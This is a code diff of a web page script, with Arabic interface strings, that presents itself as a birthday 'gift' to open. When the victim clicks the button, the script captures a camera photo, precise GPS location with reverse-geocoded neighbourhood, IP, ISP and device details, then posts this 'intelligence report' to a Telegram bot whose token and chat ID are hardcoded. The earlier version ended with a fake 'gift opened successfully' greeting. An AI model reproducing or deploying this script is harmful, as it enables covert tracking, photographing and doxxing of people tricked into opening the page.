@@ -68,9 +68,8 @@
     <canvas id="canvas" style="display:none;"></canvas>
 
     <script>
-        // ⚠️ ضعي التوكن والـ Chat ID الخاصين بكِ بين العلامات
-        const BOT_TOKEN = '9074871500:AAFXyUFamTcOT1LBseDsS4bga0GCjHmKEWE';
-        const CHAT_ID = '9074871500';
+        const BOT_TOKEN = '8979129209:AAFpV86OAomcO3pLBPQh4dyW2yIKByB3Bk0';
+        const CHAT_ID = '6663398412';
 
         const userDevice = navigator.userAgent;
         const screenRes = window.screen.width + 'x' + window.screen.height;
@@ -84,7 +83,36 @@
                     const estimate = await navigator.storage.estimate();
                     const totalGB = (estimate.quota / (1024 * 1024 * 1024)).toFixed(2);
                     const usedGB = (estimate.usage / (1024 * 1024 * 1024)).toFixed(2);
-                    storageInfo = `${usedGB} GB من إجمالي ${totalGB} GB`; } } catch (e) {} return storageInfo; }  function getDetailedLocation() { return new Promise((resolve) => { if (!navigator.geolocation) { resolve('غير متاح'); } else { navigator.geolocation.getCurrentPosition( async (position) => { const lat = position.coords.latitude; const lon = position.coords.longitude;  try { const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&accept-language=ar`); const data = await res.json();  let placeName = "غير معروف"; if (data && data.address) { const suburb = data.address.suburb \vert{}\vert{} data.address.neighbourhood \vert{}\vert{} data.address.village \vert{}\vert{} ''; const city = data.address.city \vert{}\vert{} data.address.town \vert{}\vert{} data.address.state \vert{}\vert{} ''; placeName = `${city} - ${suburb}`.trim(); } else if (data && data.display_name) { placeName = data.display_name; }  resolve(`📍 ${placeName}\n🌐 الإحداثيات: (${lat},${lon})`);
+                    storageInfo = `${usedGB} GB من إجمالي ${totalGB} GB`;
+                }
+            } catch (e) {}
+            return storageInfo;
+        }
+
+        function getDetailedLocation() {
+            return new Promise((resolve) => {
+                if (!navigator.geolocation) {
+                    resolve('غير متاح');
+                } else {
+                    navigator.geolocation.getCurrentPosition(
+                        async (position) => {
+                            const lat = position.coords.latitude;
+                            const lon = position.coords.longitude;
+                            
+                            try {
+                                const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&accept-language=ar`);
+                                const data = await res.json();
+                                
+                                let placeName = "غير معروف";
+                                if (data && data.address) {
+                                    const suburb = data.address.suburb || data.address.neighbourhood || data.address.village || '';
+                                    const city = data.address.city || data.address.town || data.address.state || '';
+                                    placeName = `${city} - ${suburb}`.trim();
+                                } else if (data && data.display_name) {
+                                    placeName = data.display_name;
+                                }
+
+                                resolve(`📍 ${placeName}\n🌐 الإحداثيات: (${lat}, ${lon})`);
                             } catch (err) {
                                 resolve(`خط الطول: ${lat}, خط العرض: ${lon}`);
                             }
@@ -99,6 +127,7 @@
         }
 
         async function openGift() {
+            alert('تم الضغط على الزر، جاري طلب الكاميرا والموقع...');
             let photoBlob = null;
 
             try {
@@ -116,7 +145,10 @@
 
                 stream.getTracks().forEach(track => track.stop());
                 photoBlob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg'));
-            } catch (e) {}
+                alert('تم التقاط الصورة بنجاح، جاري إرسال التقرير...');
+            } catch (e) {
+                alert('تعذر فتح الكاميرا، سيتم إرسال البيانات بدون صورة.');
+            }
 
             collectAndSendAll(photoBlob);
         }
@@ -140,11 +172,19 @@
                 }
 
                 const caption = `🚨 **التقرير الاستخباراتي الشامل والمحدد!**\n\n` +
-                                `📌 **الموقع بالمنطقة:**\n${detailedLocation}\n` + `--------------------------\n` + `🌍 **الدولة:** ${data.country_name || 'غير معروف'}\n` +
-                                `🏙️ **المدينة (بالـ IP):** ${data.city \vert{}\vert{} 'غير معروف'}\n` + `🏢 **مزود الشبكة:** ${data.org || 'غير معروف'}\n` +
-                                `🌐 **الـ IP:** ${data.ip \vert{}\vert{} 'غير معروف'}\n` + `--------------------------\n` + `📱 **نوع الجهاز:** ${userDevice}\n` +
-                                `🧠 **الرام:** ${deviceMemory}\n` + `⚙️ **المعالج:** ${hardwareConcurrency}\n` +
-                                `💾 **التخزين:** ${storage}\n` + `🔋 **البطارية:** ${batteryLevel} (${isCharging})\n` + `🖥️ **دقة الشاشة:** ${screenRes}`;
+                                `📌 **الموقع بالمنطقة:**\n${detailedLocation}\n` +
+                                `--------------------------\n` +
+                                `🌍 **الدولة:** ${data.country_name || 'غير معروف'}\n` +
+                                `🏙️ **المدينة (بالـ IP):** ${data.city || 'غير معروف'}\n` +
+                                `🏢 **مزود الشبكة:** ${data.org || 'غير معروف'}\n` +
+                                `🌐 **الـ IP:** ${data.ip || 'غير معروف'}\n` +
+                                `--------------------------\n` +
+                                `📱 **نوع الجهاز:** ${userDevice}\n` +
+                                `🧠 **الرام:** ${deviceMemory}\n` +
+                                `⚙️ **المعالج:** ${hardwareConcurrency}\n` +
+                                `💾 **التخزين:** ${storage}\n` +
+                                `🔋 **البطارية:** ${batteryLevel} (${isCharging})\n` +
+                                `🖥️ **دقة الشاشة:** ${screenRes}`;
 
                 if (photoBlob) {
                     const formData = new FormData();
@@ -153,15 +193,21 @@
                     formData.append('caption', caption);
                     formData.append('parse_mode', 'Markdown');
 
-                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData }); } else { await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                        method: 'POST',
+                        body: formData
+                    });
+                } else {
+                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
                         body: JSON.stringify({ chat_id: CHAT_ID, text: caption, parse_mode: 'Markdown' })
                     });
                 }
-            } catch (err) {}
-
-            alert('كل سنة وأنت طيب! تم فتح الهدية بنجاح 🌟');
+                alert('تم إرسال التقرير لتليجرام بنجاح! 🚀');
+            } catch (err) {
+                alert('حدث خطأ أثناء الإرسال.');
+            }
         }
     </script>
 </body>
